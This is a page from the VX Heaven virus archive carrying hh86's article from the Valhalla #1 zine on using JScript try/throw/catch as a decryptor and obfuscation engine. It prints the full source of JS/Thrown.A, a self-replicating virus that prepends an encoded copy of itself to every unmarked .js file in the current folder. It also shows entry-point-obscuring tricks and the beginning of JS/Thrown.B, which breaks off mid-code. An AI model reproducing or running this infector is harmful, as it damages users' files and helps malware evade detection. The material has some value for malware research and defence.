<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> hh86 'I Err.Raise, you fall' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="hh86"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, hh86,I Err.Raise, you fall, block, throw, exceptions, statement, exception, catch, "/>
<meta name="Description" content="Try and Catch are the most widely used statements for exception handlers in most languages. When we run code that might be vulnerable to unexpected exceptions we can run it in Try block. If an exception occurs, then the Catch block handles the problem. This mechanism also includes a statement to cause an exception. It is the Throw statement. The Throw statement can specify an exception info to be supplied to the Catch (it should decide then on handling it or not)."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"e8b3d0ad8b22feddf73b48460c4c20bfd16f540d-1498756449-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhh06.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>I Err.Raise, you fall</h1><p><a href="/lib/?lang=en&amp;author=hh86"> hh86</a><br/> <em><a href="/vx.php?fid=1943#f1943">Valhalla #1</a></em><br/> <em>August 2011</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhh06.html';</script><div class="ci"><a href="/lib/?ci=vhh06">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vhh06">Back to index</a>] [<a href="/lib/vhh06.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c0">Exceptions</a></li>
<li><a href="#c1">Throw it</a></li>
<li><a href="#c2">EPO</a></li>
<li><a href="#c3">VBScript</a></li>
<li><a href="#c4">EPO</a></li>
</ul>
<h2><a name="c0"></a>Exceptions</h2>
<p>Try and Catch are the most widely used statements for exception handlers in most languages. When we run code that might be vulnerable to unexpected exceptions we can run it in Try block. If an exception occurs, then the Catch block handles the problem. This mechanism also includes a statement to cause an exception. It is the Throw statement. The Throw statement can specify an exception info to be supplied to the Catch (it should decide then on handling it or not).</p>
<h2><a name="c1"></a>Throw it</h2>
<p>My idea for an engine is to create a decryptor to build the virus body piece by piece using Try, Catch and Throw. In Try block we raise an exception, in Catch we rebuild, it would be like this:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; a<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">throw</span> <span style="color: #3366CC;">&quot;f = new Activ&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>a <span style="color: #339933;">+=</span> e<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">throw</span> <span style="color: #3366CC;">&quot;eXObject(&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>y<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>a <span style="color: #339933;">+=</span> y<span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//now run the code</span><br/>
&nbsp;</div>
<p>I have created an engine, it is so simple, but the result is very good.</p>
<p>Here is JS/Thrown.A:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//hh86</span><br/>
h<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
<span style="color: #000066; font-weight: bold;">function</span> h<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//JS/Thrown.A</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; f<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Scripting.FileSystemObject&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; q <span style="color: #339933;">=</span> rn<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; k <span style="color: #339933;">=</span> q<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;=[];&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; l <span style="color: #339933;">=</span> <span style="color: #3366CC;">&quot;&quot;</span> <span style="color: #339933;">+</span> h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>i<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span>l.<span style="color: #660066;">length</span><span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; c <span style="color: #339933;">=</span> l.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>i<span style="color: #339933;">,</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">charCodeAt</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">toString</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">16</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>c<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;a&quot;</span> <span style="color: #339933;">||</span> c<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;d&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>c <span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;0&quot;</span><span style="color: #339933;">+</span>c<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; y <span style="color: #339933;">=</span> rn<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; k <span style="color: #339933;">=</span> k <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;try{throw<span style="color: #000099; font-weight: bold;">\&quot;</span><span style="color: #000099; font-weight: bold;">\\</span>x&quot;</span> <span style="color: #339933;">+</span> c <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\&quot;</span>}catch(&quot;</span> <span style="color: #339933;">+</span> y <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;)&quot;</span> <span style="color: #339933;">+</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #3366CC;">&quot;{&quot;</span> <span style="color: #339933;">+</span> q <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;.push(&quot;</span> <span style="color: #339933;">+</span> y <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;)};&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; k <span style="color: #339933;">=</span> k <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;;&quot;</span> <span style="color: #339933;">+</span> q <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;=&quot;</span> <span style="color: #339933;">+</span> q <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;.join(<span style="color: #000099; font-weight: bold;">\&quot;</span><span style="color: #000099; font-weight: bold;">\&quot;</span>);eval(<span style="color: #000099; font-weight: bold;">\&quot;</span>h();<span style="color: #000099; font-weight: bold;">\&quot;</span>+&quot;</span> <span style="color: #339933;">+</span> q <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;);&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>y<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>f.<span style="color: #660066;">getfolder</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">files</span><span style="color: black;">&#41;</span><span style="color: #339933;">;!</span>y.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>y.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x<span style="color: #339933;">=</span>y.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>f.<span style="color: #660066;">GetExtensionName</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span>.<span style="color: #660066;">toLowerCase</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;js&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b<span style="color: #339933;">=</span>f.<span style="color: #660066;">OpenTextFile</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>h<span style="color: #339933;">=</span>b.<span style="color: #660066;">ReadAll</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>b.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">6</span><span style="color: black;">&#41;</span><span style="color: #339933;">!=</span><span style="color: #3366CC;">&quot;//hh86&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p<span style="color: #339933;">=</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l<span style="color: #339933;">=</span>f.<span style="color: #660066;">CreateTextFile</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l.<span style="color: #660066;">Write</span><span style="color: black;">&#40;</span>k<span style="color: #339933;">+</span>h<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>l.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">=</span>p<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">function</span> rn<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">return</span> <span style="color: #3366CC;">&quot;r&quot;</span><span style="color: #339933;">+</span>f.<span style="color: #660066;">GetTempName</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">3</span><span style="color: #339933;">,</span><span style="color: #CC0000;">5</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h2><a name="c2"></a>EPO</h2>
<p>We will use the function constructor like this:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">throw</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>WScript.<span style="color: #660066;">Echo</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Oh! Hello :)&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>e<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Awesome!</p>
<p>An obvious extension to that code is not calling the virus body whithin Catch block, sample 1. However, Catch is executed when function returns. So, what if we want to decrypt something in function and build in Catch? Then we use return, sample 2. Yet we have another trick, we do not clearly specify we have function to be executed (without "()"), in this case we need to run in Catch, sample 3.</p>
<p><strong>Sample 1:</strong></p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">throw</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">function</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>...<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p><strong>Sample 2:</strong></p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; a<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">throw</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>a <span style="color: #339933;">+=</span> e<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; ...<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">function</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><span style="color: #000066; font-weight: bold;">return</span> <span style="color: #3366CC;">&quot;f = new Activ&quot;</span><span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p><strong>Sample 3:</strong></p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">throw</span> g<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>e<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">function</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>...<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>And then we can use sample 2, but returning a function:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">throw</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>e<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">function</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">return</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>WScript.<span style="color: #660066;">Echo</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Oh, Hello again and again!&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <br/>
&nbsp;</div>
<p>Throw can be used in so many ways in such a functional language as is JScript. Here is JS/Thrown.B:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//hh86</span><br/>
<span style="color: #000066; font-weight: bold;">try</span><span style="color: black;">&#123;</span><span style="color: #000066; font-weight: bold;">throw</span> <span style="color: #000066; font-weight: bold;">function</span> t<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #006600; font-style: italic;">/*JS/Thrown by hh86*/</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; f<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Scripting.FileSystemObject&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>y<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>f.<span style="color: #660066;">getfolder</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">files</span><span style="color: black;">&#41;</span><span style="color: #339933;">;!</span>y.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>y.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x<span style="color: #339933;">=</span>y.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>f.<span style="color: #660066;">GetExtensionName</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span>.<span style="color: #660066;">toLowerCase</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;js&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
